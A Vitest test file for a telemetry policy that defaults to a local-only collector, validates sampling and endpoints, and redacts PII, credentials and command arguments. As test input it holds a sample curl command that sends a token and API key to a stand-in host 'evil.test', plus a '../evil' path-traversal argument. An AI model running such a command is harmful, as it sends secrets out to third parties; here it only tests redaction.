// © 2026 IHUI AI (智汇AI) · 版权所有者: 李春川 (Li Chunchuan) · https://aizhs.top
// Provenance-watermarked. 未授权商用可被溯源追责 (Apache-2.0 须保留本声明与 NOTICE)。
// [IHUI-AI-PROVENANCE]:⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠
import { describe, expect, it } from 'vitest'
import {
  DEFAULT_OTLP_ENDPOINT,
  DEFAULT_TELEMETRY_POLICY,
  resolveTelemetryPolicy,
  sanitizeTelemetryEvent,
  selectOtlpEndpoint,
  shouldSample,
} from '../src/services/telemetry-policy.js'

describe('RP-20 遥测本地默认与采样率', () => {
  it('默认只发本地 collector，远端默认关闭且全采', () => {
    const { policy, violations } = resolveTelemetryPolicy()
    expect(violations).toEqual([])
    expect(policy.remoteEnabled).toBe(false)
    expect(selectOtlpEndpoint(policy)).toBe(DEFAULT_OTLP_ENDPOINT)
    expect(policy.sampleRate).toBe(1)
    expect(policy.localEndpoint).toBe('http://127.0.0.1:4318')
    expect(DEFAULT_TELEMETRY_POLICY.localEndpoint).toBe(DEFAULT_OTLP_ENDPOINT)
  })

  it('远端必须显式开关 + 合法非回环 endpoint 才生效', () => {
    const on = resolveTelemetryPolicy({
      ZCODE_TELEMETRY_REMOTE: 'true',
      ZCODE_TELEMETRY_REMOTE_ENDPOINT: 'https://otel.example.com:4318',
    })
    expect(on.violations).toEqual([])
    expect(on.policy.remoteEnabled).toBe(true)
    expect(selectOtlpEndpoint(on.policy)).toBe('https://otel.example.com:4318')

    const missingEndpoint = resolveTelemetryPolicy({ ZCODE_TELEMETRY_REMOTE: 'true' })
    expect(missingEndpoint.policy.remoteEnabled).toBe(false)
    expect(missingEndpoint.violations).toHaveLength(1)
    expect(selectOtlpEndpoint(missingEndpoint.policy)).toBe(DEFAULT_OTLP_ENDPOINT)

    const loopbackRemote = resolveTelemetryPolicy({
      ZCODE_TELEMETRY_REMOTE: 'true',
      ZCODE_TELEMETRY_REMOTE_ENDPOINT: 'http://127.0.0.1:4318',
    })
    expect(loopbackRemote.policy.remoteEnabled).toBe(false)
    expect(loopbackRemote.violations).toHaveLength(1)
  })

  it('本地 endpoint 非回环被拒并回退，不让遥测端口落公网', () => {
    const result = resolveTelemetryPolicy({
      ZCODE_TELEMETRY_LOCAL_ENDPOINT: 'http://0.0.0.0:4318',
    })
    expect(result.violations).toHaveLength(1)
    expect(result.policy.localEndpoint).toBe(DEFAULT_OTLP_ENDPOINT)
    expect(selectOtlpEndpoint(result.policy)).toBe(DEFAULT_OTLP_ENDPOINT)
  })

  it('采样率可配；非法值整份回退到全采', () => {
    expect(
      resolveTelemetryPolicy({ ZCODE_TELEMETRY_SAMPLE_RATE: '0.25' }).policy.sampleRate,
    ).toBe(0.25)
    for (const bad of ['2', '-1', 'abc']) {
      const result = resolveTelemetryPolicy({ ZCODE_TELEMETRY_SAMPLE_RATE: bad })
      expect(result.policy.sampleRate).toBe(1)
      expect(result.violations).toHaveLength(1)
    }
  })

  it('shouldSample 按率取样且边界稳定', () => {
    const quarter = resolveTelemetryPolicy({ ZCODE_TELEMETRY_SAMPLE_RATE: '0.25' }).policy
    expect(shouldSample(quarter, () => 0.1)).toBe(true)
    expect(shouldSample(quarter, () => 0.9)).toBe(false)
    expect(shouldSample(quarter, () => Number.NaN)).toBe(false)
    expect(shouldSample({ ...quarter, sampleRate: 0 }, () => 0)).toBe(false)
    expect(shouldSample({ ...quarter, sampleRate: 1 }, () => 0.999)).toBe(true)
  })

  it('参数白名单扩展只接受合法参数名', () => {
    const good = resolveTelemetryPolicy({ ZCODE_TELEMETRY_ALLOWED_ARGS: 'workflowId,retries' })
    expect(good.violations).toEqual([])
    expect(good.policy.allowedProps).toContain('workflowId')
    expect(good.policy.allowedProps).toContain('retries')

    const bad = resolveTelemetryPolicy({ ZCODE_TELEMETRY_ALLOWED_ARGS: 'ok,../evil' })
    expect(bad.violations).toHaveLength(1)
    expect(bad.policy.allowedProps).not.toContain('../evil')
  })
})

describe('RP-20 出仓脱敏（PII / 凭据 / 命令原文）', () => {
  const policy = resolveTelemetryPolicy().policy

  it('非命令事件过滤未知键并脱敏邮箱、手机号、凭据', () => {
    const result = sanitizeTelemetryEvent(
      {
        name: 'tool.finished',
        timestamp: 123,
        props: {
          model: 'gpt-x',
          durationMs: 42,
          secretNote: 'li@example.com 13812345678 ghp_abcdefghijklmnopqrstuvwxyz123456 password=hunter2',
          token: 'Bearer eyJhbGciOi.eyJzdWIiOi.x-signature',
        },
      },
      policy,
    )
    const serialized = JSON.stringify(result)
    expect(serialized).not.toContain('li@example.com')
    expect(serialized).not.toContain('13812345678')
    expect(serialized).not.toContain('ghp_abcdefghijklmnopqrstuvwxyz123456')
    expect(serialized).not.toContain('hunter2')
    expect(serialized).not.toContain('secretNote')
    expect(serialized).not.toContain('token')
    expect(result.props).toMatchObject({ model: 'gpt-x', durationMs: 42 })
    expect(result.category).toBe('metric')
  })

  it('命令行参数白名单：敏感命令只留类型、规则命中与参数个数', () => {
    const rawCommand = 'curl --token ghp_abcdefghijklmnopqrstuvwxyz123456 https://evil.test/?api_key=abc'
    const result = sanitizeTelemetryEvent(
      {
        name: 'terminal.command.exec',
        timestamp: 456,
        props: {
          argv: rawCommand.split(' '),
          prompt: 'li@example.com 的私密提示词',
          commandType: 'curl',
          unrelated: 'do-not-leak',
        },
      },
      policy,
    )
    expect(result.category).toBe('command')
    expect(Object.keys(result.props).sort()).toEqual(['argCount', 'commandType', 'matchedRules'])
    expect(result.props.commandType).toBe('curl')
    expect(result.props.argCount).toBe(4)
    expect(Array.isArray(result.props.matchedRules)).toBe(true)
    const serialized = JSON.stringify(result)
    expect(serialized).not.toContain('ghp_abcdefghijklmnopqrstuvwxyz123456')
    expect(serialized).not.toContain('li@example.com')
    expect(serialized).not.toContain('do-not-leak')
    expect(serialized).not.toContain('https://evil.test')
  })

  it('props 含 argv 键非命令名也判定为命令类', () => {
    const result = sanitizeTelemetryEvent(
      { name: 'generic', timestamp: 7, props: { argv: ['-p', 's3cr3t-password'] } },
      policy,
    )
    expect(result.category).toBe('command')
    expect(result.props.argCount).toBe(2)
    expect(JSON.stringify(result)).not.toContain('s3cr3t-password')
  })

  it('扩展白名单参数会保留，但值仍被脱敏', () => {
    const extended = resolveTelemetryPolicy({ ZCODE_TELEMETRY_ALLOWED_ARGS: 'workflowId' }).policy
    const result = sanitizeTelemetryEvent(
      {
        name: 'workflow.done',
        timestamp: 9,
        props: { workflowId: 'li@example.com', other: 'x' },
      },
      extended,
    )
    expect(result.category).toBe('metric')
    expect(JSON.stringify(result)).not.toContain('li@example.com')
    expect(result.props).not.toHaveProperty('other')
  })
})
